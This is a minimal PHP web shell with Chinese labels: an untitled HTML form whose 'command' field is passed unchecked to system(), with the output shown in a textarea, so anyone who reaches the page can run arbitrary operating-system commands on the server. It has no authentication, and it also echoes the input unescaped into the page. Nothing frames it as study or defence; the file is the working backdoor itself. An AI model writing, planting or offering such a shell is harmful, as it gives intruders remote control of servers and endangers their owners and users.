<html>
<head>
<title></title>
</head>
<body>

<form name="myform" action="<?php echo $PHP_SELF ?>" method="post">
<p>CMD命令:</p>
<input type="text" name="command" size="60" <?php if ($command) { echo "value=\"$command\"";} ?> >
<input name="submit_btn" type="submit" value="发送CMD命令"></p>
<p>输出结果:</p>
<textarea cols="80" rows="20" readonly>
<?php
if ($command) {
system($command);
}
?>
</textarea>
</form>
</body>
</html>